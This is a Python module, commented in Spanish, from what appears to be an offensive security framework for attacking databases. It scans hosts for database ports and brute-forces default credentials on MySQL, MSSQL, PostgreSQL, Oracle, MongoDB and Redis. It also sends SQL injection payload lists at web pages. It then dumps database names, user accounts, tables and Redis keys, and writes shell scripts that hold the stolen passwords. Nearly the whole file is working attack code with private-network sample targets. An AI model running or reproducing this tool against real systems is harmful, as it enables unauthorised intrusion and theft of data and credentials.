"""
Módulo de Exfiltración de Bases de Datos SQL
Incluye conexiones remotas, SQL injection y exfiltración de datos
"""

import subprocess
import json
import time
import os
import requests
import socket
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.logging_system import LoggingSystem

class SQLExfiltrationModule:
    """Módulo de exfiltración de bases de datos SQL"""
    
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.logging_system = LoggingSystem(config, logger)
        
        # Resultados de exfiltración SQL
        self.results = {
            'databases_discovered': [],
            'sql_injections': [],
            'data_exfiltrated': [],
            'remote_connections': [],
            'credentials_found': []
        }
        
        # Archivos de evidencia
        self.evidence_dir = Path("evidence/sql_exfiltration")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        
        # Configuración de bases de datos
        self.db_configs = {
            'mysql': {'port': 3306, 'default_users': ['root', 'admin', 'mysql']},
            'mssql': {'port': 1433, 'default_users': ['sa', 'admin', 'administrator']},
            'postgresql': {'port': 5432, 'default_users': ['postgres', 'admin', 'root']},
            'oracle': {'port': 1521, 'default_users': ['system', 'sys', 'admin']},
            'mongodb': {'port': 27017, 'default_users': ['admin', 'root', 'user']},
            'redis': {'port': 6379, 'default_users': ['default', 'admin']}
        }
        
        # Payloads de SQL injection
        self.sql_payloads = {
            'union': [
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT user(),database(),version(),4,5--",
                "' UNION SELECT table_name,column_name,3,4,5 FROM information_schema.columns--"
            ],
            'boolean': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' AND 1=1--",
                "' AND 1=2--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "'; SELECT SLEEP(5)--"
            ],
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
            ]
        }
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logging_system.log_command(
                ' '.join(command),
                result.stdout + result.stderr,
                result.returncode,
                "SQL_EXFILTRATION"
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False}
    
    def discover_databases(self, discovered_hosts: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Descubrir bases de datos en hosts"""
        self.logger.info("🔍 DESCUBRIENDO BASES DE DATOS")
        
        databases = []
        
        for host in discovered_hosts:
            ip = host['ip']
            self.logger.info(f"🔍 Escaneando bases de datos en {ip}")
            
            # Escanear puertos de bases de datos
            for db_type, config in self.db_configs.items():
                port = config['port']
                
                if self._test_database_port(ip, port):
                    db_info = {
                        'host': ip,
                        'port': port,
                        'type': db_type,
                        'status': 'open',
                        'timestamp': time.time()
                    }
                    
                    # Intentar conectar con credenciales por defecto
                    credentials = self._test_default_credentials(ip, port, db_type, config['default_users'])
                    if credentials:
                        db_info['credentials'] = credentials
                        db_info['status'] = 'accessible'
                    
                    databases.append(db_info)
                    self.logger.info(f"✅ Base de datos {db_type} encontrada en {ip}:{port}")
        
        self.results['databases_discovered'] = databases
        return databases
    
    def _test_database_port(self, ip: str, port: int) -> bool:
        """Probar si un puerto de base de datos está abierto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _test_default_credentials(self, ip: str, port: int, db_type: str, users: List[str]) -> Optional[Dict[str, str]]:
        """Probar credenciales por defecto"""
        default_passwords = ['', 'admin', 'password', 'root', '123456', 'admin123']
        
        for user in users:
            for password in default_passwords:
                if self._test_db_connection(ip, port, db_type, user, password):
                    return {'username': user, 'password': password}
        
        return None
    
    def _test_db_connection(self, ip: str, port: int, db_type: str, username: str, password: str) -> bool:
        """Probar conexión a base de datos"""
        try:
            if db_type == 'mysql':
                return self._test_mysql_connection(ip, port, username, password)
            elif db_type == 'mssql':
                return self._test_mssql_connection(ip, port, username, password)
            elif db_type == 'postgresql':
                return self._test_postgresql_connection(ip, port, username, password)
            elif db_type == 'oracle':
                return self._test_oracle_connection(ip, port, username, password)
            elif db_type == 'mongodb':
                return self._test_mongodb_connection(ip, port, username, password)
            elif db_type == 'redis':
                return self._test_redis_connection(ip, port, username, password)
        except Exception as e:
            self.logger.debug(f"Error probando conexión {db_type}: {e}")
        
        return False
    
    def _test_mysql_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        """Probar conexión MySQL"""
        try:
            command = ['mysql', '-h', ip, '-P', str(port), '-u', username, f'-p{password}', '-e', 'SELECT 1;']
            result = self._run_command(command, timeout=10)
            return result['success']
        except:
            return False
    
    def _test_mssql_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        """Probar conexión MSSQL"""
        try:
            command = ['sqlcmd', '-S', f'{ip},{port}', '-U', username, '-P', password, '-Q', 'SELECT 1']
            result = self._run_command(command, timeout=10)
            return result['success']
        except:
            return False
    
    def _test_postgresql_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        """Probar conexión PostgreSQL"""
        try:
            command = ['psql', '-h', ip, '-p', str(port), '-U', username, '-d', 'postgres', '-c', 'SELECT 1;']
            result = self._run_command(command, timeout=10)
            return result['success']
        except:
            return False
    
    def _test_oracle_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        """Probar conexión Oracle"""
        try:
            command = ['sqlplus', f'{username}/{password}@{ip}:{port}/XE', '@', '/dev/null']
            result = self._run_command(command, timeout=10)
            return result['success']
        except:
            return False
    
    def _test_mongodb_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        """Probar conexión MongoDB"""
        try:
            if username and password:
                command = ['mongo', f'mongodb://{username}:{password}@{ip}:{port}/admin', '--eval', 'db.runCommand("ping")']
            else:
                command = ['mongo', f'{ip}:{port}/admin', '--eval', 'db.runCommand("ping")']
            result = self._run_command(command, timeout=10)
            return result['success']
        except:
            return False
    
    def _test_redis_connection(self, ip: str, port: int, username: str, password: str) -> bool:
        """Probar conexión Redis"""
        try:
            if password:
                command = ['redis-cli', '-h', ip, '-p', str(port), '-a', password, 'ping']
            else:
                command = ['redis-cli', '-h', ip, '-p', str(port), 'ping']
            result = self._run_command(command, timeout=10)
            return result['success'] and 'PONG' in result['stdout']
        except:
            return False
    
    def perform_sql_injection(self, web_targets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Realizar ataques de SQL injection en aplicaciones web"""
        self.logger.info("💉 REALIZANDO ATAQUES DE SQL INJECTION")
        
        sql_injections = []
        
        for target in web_targets:
            url = target.get('url', '')
            if not url:
                continue
            
            self.logger.info(f"💉 Probando SQL injection en {url}")
            
            # Probar diferentes tipos de SQL injection
            for injection_type, payloads in self.sql_payloads.items():
                for payload in payloads:
                    result = self._test_sql_injection(url, payload, injection_type)
                    if result['success']:
                        sql_injections.append(result)
                        self.logger.info(f"✅ SQL injection exitoso en {url} ({injection_type})")
                        break
        
        self.results['sql_injections'] = sql_injections
        return sql_injections
    
    def _test_sql_injection(self, url: str, payload: str, injection_type: str) -> Dict[str, Any]:
        """Probar SQL injection específico"""
        try:
            # Parámetros comunes para probar
            params = ['id', 'user', 'search', 'q', 'query', 'page', 'category']
            
            for param in params:
                test_url = f"{url}?{param}={payload}"
                
                try:
                    response = requests.get(test_url, timeout=10)
                    
                    # Detectar SQL injection basado en el tipo
                    if self._detect_sql_injection(response, injection_type):
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': injection_type,
                            'response_code': response.status_code,
                            'response_length': len(response.text),
                            'timestamp': time.time(),
                            'success': True
                        }
                except:
                    continue
            
            return {'success': False}
            
        except Exception as e:
            self.logger.debug(f"Error en SQL injection: {e}")
            return {'success': False}
    
    def _detect_sql_injection(self, response: requests.Response, injection_type: str) -> bool:
        """Detectar si la respuesta indica SQL injection exitoso"""
        response_text = response.text.lower()
        
        if injection_type == 'union':
            # Detectar UNION SELECT exitoso
            union_indicators = ['mysql', 'postgresql', 'microsoft', 'oracle', 'sqlite']
            return any(indicator in response_text for indicator in union_indicators)
        
        elif injection_type == 'boolean':
            # Detectar diferencias en respuestas booleanas
            return len(response_text) > 100  # Respuesta más larga indica posible éxito
        
        elif injection_type == 'time_based':
            # Para time-based, necesitaríamos medir el tiempo de respuesta
            return response.elapsed.total_seconds() > 4
        
        elif injection_type == 'error_based':
            # Detectar errores de base de datos
            error_indicators = [
                'mysql_fetch_array', 'mysql_num_rows', 'postgresql', 'microsoft ole db',
                'oracle error', 'sqlite error', 'warning: mysql', 'fatal error'
            ]
            return any(indicator in response_text for indicator in error_indicators)
        
        return False
    
    def exfiltrate_database_data(self, databases: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Exfiltrar datos de bases de datos accesibles"""
        self.logger.info("📤 EXFILTRANDO DATOS DE BASES DE DATOS")
        
        exfiltrated_data = []
        
        for db in databases:
            if db.get('status') == 'accessible' and 'credentials' in db:
                self.logger.info(f"📤 Exfiltrando datos de {db['type']} en {db['host']}")
                
                data = self._extract_database_data(db)
                if data:
                    exfiltrated_data.append(data)
        
        self.results['data_exfiltrated'] = exfiltrated_data
        return exfiltrated_data
    
    def _extract_database_data(self, db: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Extraer datos de una base de datos específica"""
        db_type = db['type']
        host = db['host']
        port = db['port']
        credentials = db['credentials']
        
        try:
            if db_type == 'mysql':
                return self._extract_mysql_data(host, port, credentials)
            elif db_type == 'mssql':
                return self._extract_mssql_data(host, port, credentials)
            elif db_type == 'postgresql':
                return self._extract_postgresql_data(host, port, credentials)
            elif db_type == 'mongodb':
                return self._extract_mongodb_data(host, port, credentials)
            elif db_type == 'redis':
                return self._extract_redis_data(host, port, credentials)
        except Exception as e:
            self.logger.error(f"Error extrayendo datos de {db_type}: {e}")
        
        return None
    
    def _extract_mysql_data(self, host: str, port: int, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Extraer datos de MySQL"""
        username = credentials['username']
        password = credentials['password']
        
        # Comandos para extraer información
        commands = [
            'SHOW DATABASES;',
            'SELECT user, host FROM mysql.user;',
            'SHOW TABLES;',
            'SELECT table_name, table_rows FROM information_schema.tables;'
        ]
        
        extracted_data = {
            'host': host,
            'port': port,
            'type': 'mysql',
            'credentials': credentials,
            'databases': [],
            'users': [],
            'tables': [],
            'timestamp': time.time()
        }
        
        for cmd in commands:
            command = ['mysql', '-h', host, '-P', str(port), '-u', username, f'-p{password}', '-e', cmd]
            result = self._run_command(command, timeout=30)
            
            if result['success']:
                if 'SHOW DATABASES' in cmd:
                    extracted_data['databases'] = result['stdout'].split('\n')[1:-1]
                elif 'mysql.user' in cmd:
                    extracted_data['users'] = result['stdout'].split('\n')[1:-1]
                elif 'SHOW TABLES' in cmd:
                    extracted_data['tables'] = result['stdout'].split('\n')[1:-1]
        
        return extracted_data
    
    def _extract_mssql_data(self, host: str, port: int, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Extraer datos de MSSQL"""
        username = credentials['username']
        password = credentials['password']
        
        commands = [
            'SELECT name FROM sys.databases;',
            'SELECT name FROM sys.server_principals WHERE type = \'S\';',
            'SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;'
        ]
        
        extracted_data = {
            'host': host,
            'port': port,
            'type': 'mssql',
            'credentials': credentials,
            'databases': [],
            'users': [],
            'tables': [],
            'timestamp': time.time()
        }
        
        for cmd in commands:
            command = ['sqlcmd', '-S', f'{host},{port}', '-U', username, '-P', password, '-Q', cmd]
            result = self._run_command(command, timeout=30)
            
            if result['success']:
                if 'sys.databases' in cmd:
                    extracted_data['databases'] = result['stdout'].split('\n')[2:-2]
                elif 'sys.server_principals' in cmd:
                    extracted_data['users'] = result['stdout'].split('\n')[2:-2]
                elif 'INFORMATION_SCHEMA.TABLES' in cmd:
                    extracted_data['tables'] = result['stdout'].split('\n')[2:-2]
        
        return extracted_data
    
    def _extract_postgresql_data(self, host: str, port: int, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Extraer datos de PostgreSQL"""
        username = credentials['username']
        password = credentials['password']
        
        commands = [
            '\\l',
            '\\du',
            '\\dt'
        ]
        
        extracted_data = {
            'host': host,
            'port': port,
            'type': 'postgresql',
            'credentials': credentials,
            'databases': [],
            'users': [],
            'tables': [],
            'timestamp': time.time()
        }
        
        for cmd in commands:
            command = ['psql', '-h', host, '-p', str(port), '-U', username, '-d', 'postgres', '-c', cmd]
            result = self._run_command(command, timeout=30)
            
            if result['success']:
                if '\\l' in cmd:
                    extracted_data['databases'] = result['stdout'].split('\n')[3:-3]
                elif '\\du' in cmd:
                    extracted_data['users'] = result['stdout'].split('\n')[3:-3]
                elif '\\dt' in cmd:
                    extracted_data['tables'] = result['stdout'].split('\n')[3:-3]
        
        return extracted_data
    
    def _extract_mongodb_data(self, host: str, port: int, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Extraer datos de MongoDB"""
        username = credentials['username']
        password = credentials['password']
        
        commands = [
            'db.adminCommand("listDatabases")',
            'db.runCommand("usersInfo")',
            'db.runCommand("listCollections")'
        ]
        
        extracted_data = {
            'host': host,
            'port': port,
            'type': 'mongodb',
            'credentials': credentials,
            'databases': [],
            'users': [],
            'collections': [],
            'timestamp': time.time()
        }
        
        for cmd in commands:
            if username and password:
                command = ['mongo', f'mongodb://{username}:{password}@{host}:{port}/admin', '--eval', cmd]
            else:
                command = ['mongo', f'{host}:{port}/admin', '--eval', cmd]
            
            result = self._run_command(command, timeout=30)
            
            if result['success']:
                if 'listDatabases' in cmd:
                    extracted_data['databases'] = result['stdout'].split('\n')[1:-1]
                elif 'usersInfo' in cmd:
                    extracted_data['users'] = result['stdout'].split('\n')[1:-1]
                elif 'listCollections' in cmd:
                    extracted_data['collections'] = result['stdout'].split('\n')[1:-1]
        
        return extracted_data
    
    def _extract_redis_data(self, host: str, port: int, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Extraer datos de Redis"""
        password = credentials.get('password', '')
        
        commands = [
            'INFO',
            'KEYS *',
            'CONFIG GET *'
        ]
        
        extracted_data = {
            'host': host,
            'port': port,
            'type': 'redis',
            'credentials': credentials,
            'info': '',
            'keys': [],
            'config': [],
            'timestamp': time.time()
        }
        
        for cmd in commands:
            if password:
                command = ['redis-cli', '-h', host, '-p', str(port), '-a', password, cmd]
            else:
                command = ['redis-cli', '-h', host, '-p', str(port), cmd]
            
            result = self._run_command(command, timeout=30)
            
            if result['success']:
                if cmd == 'INFO':
                    extracted_data['info'] = result['stdout']
                elif cmd == 'KEYS *':
                    extracted_data['keys'] = result['stdout'].split('\n')[:-1]
                elif cmd == 'CONFIG GET *':
                    extracted_data['config'] = result['stdout'].split('\n')[:-1]
        
        return extracted_data
    
    def establish_remote_connections(self, databases: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Establecer conexiones remotas a bases de datos"""
        self.logger.info("🔗 ESTABLECIENDO CONEXIONES REMOTAS A BASES DE DATOS")
        
        remote_connections = []
        
        for db in databases:
            if db.get('status') == 'accessible' and 'credentials' in db:
                connection = self._create_remote_connection(db)
                if connection:
                    remote_connections.append(connection)
        
        self.results['remote_connections'] = remote_connections
        return remote_connections
    
    def _create_remote_connection(self, db: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Crear conexión remota a base de datos"""
        db_type = db['type']
        host = db['host']
        port = db['port']
        credentials = db['credentials']
        
        # Crear script de conexión
        connection_script = self.evidence_dir / f"db_connection_{host}_{db_type}.sh"
        
        with open(connection_script, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"# Conexión remota a {db_type} en {host}:{port}\n")
            f.write(f"echo 'Conectando a {db_type} en {host}:{port}'\n")
            f.write(f"echo 'Usuario: {credentials['username']}'\n")
            f.write(f"echo 'Contraseña: {credentials['password']}'\n")
            f.write("\n")
            
            if db_type == 'mysql':
                f.write(f"mysql -h {host} -P {port} -u {credentials['username']} -p{credentials['password']}\n")
            elif db_type == 'mssql':
                f.write(f"sqlcmd -S {host},{port} -U {credentials['username']} -P {credentials['password']}\n")
            elif db_type == 'postgresql':
                f.write(f"psql -h {host} -p {port} -U {credentials['username']} -d postgres\n")
            elif db_type == 'mongodb':
                if credentials['username'] and credentials['password']:
                    f.write(f"mongo mongodb://{credentials['username']}:{credentials['password']}@{host}:{port}/admin\n")
                else:
                    f.write(f"mongo {host}:{port}/admin\n")
            elif db_type == 'redis':
                if credentials['password']:
                    f.write(f"redis-cli -h {host} -p {port} -a {credentials['password']}\n")
                else:
                    f.write(f"redis-cli -h {host} -p {port}\n")
        
        # Hacer ejecutable
        os.chmod(connection_script, 0o755)
        
        connection_info = {
            'host': host,
            'port': port,
            'type': db_type,
            'credentials': credentials,
            'connection_script': str(connection_script),
            'timestamp': time.time()
        }
        
        self.logger.info(f"✅ Conexión remota configurada para {db_type} en {host}")
        return connection_info
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de exfiltración SQL"""
        self.logger.info("🚀 INICIANDO MÓDULO DE EXFILTRACIÓN SQL")
        
        start_time = time.time()
        
        try:
            # En un escenario real, los hosts vendrían del módulo de reconocimiento
            # Por ahora usamos datos de ejemplo basados en el reporte
            discovered_hosts = [
                {'ip': '192.168.1.5', 'vendor': 'Hewlett Packard'},
                {'ip': '192.168.1.7', 'vendor': 'Hewlett Packard'},
                {'ip': '192.168.1.12', 'vendor': 'Hewlett Packard'},
                {'ip': '192.168.1.17', 'vendor': 'Hewlett Packard'},
                {'ip': '192.168.1.18', 'vendor': 'Hewlett Packard'}
            ]
            
            # 1. Descubrir bases de datos
            databases = self.discover_databases(discovered_hosts)
            
            # 2. Realizar SQL injection en aplicaciones web
            web_targets = [
                {'url': 'http://192.168.1.5/login.php'},
                {'url': 'http://192.168.1.7/search.php'},
                {'url': 'http://192.168.1.12/products.php'}
            ]
            sql_injections = self.perform_sql_injection(web_targets)
            
            # 3. Exfiltrar datos de bases de datos accesibles
            exfiltrated_data = self.exfiltrate_database_data(databases)
            
            # 4. Establecer conexiones remotas
            remote_connections = self.establish_remote_connections(databases)
            
            # 5. Guardar evidencia
            self.logging_system.save_json_evidence(
                'sql_exfiltration_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ EXFILTRACIÓN SQL COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {len(databases)} bases de datos, {len(sql_injections)} SQL injections, {len(remote_connections)} conexiones remotas")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en exfiltración SQL: {e}")
            return self.results
